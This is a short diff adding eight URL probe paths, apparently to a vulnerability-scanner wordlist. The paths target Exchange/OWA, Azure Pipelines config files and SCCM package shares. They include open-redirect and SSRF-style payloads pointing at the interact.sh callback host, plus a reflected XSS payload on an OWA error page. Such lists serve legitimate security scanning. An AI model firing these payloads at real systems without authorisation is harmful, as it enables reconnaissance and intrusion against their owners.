@@ -1,0 +1,8 @@
+/exchweb/bin/redir.asp?URL=https://interact.sh
+/CookieAuth.dll?GetLogon?url=%2Fexchweb%2Fbin%2Fredir.asp%3FURL%3Dhttps%3A%2F%2Finteract.sh&reason=0
+/owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
+/.azure-pipelines.yml
+/azure-pipelines.yml
+/SMS_DP_SMSPKG$/Datalib
+:80/SMS_DP_SMSPKG$/Datalib
+/autodiscover/autodiscover.json/v1.0/{{randstr}}@interact.sh?Protocol=Autodiscoverv1
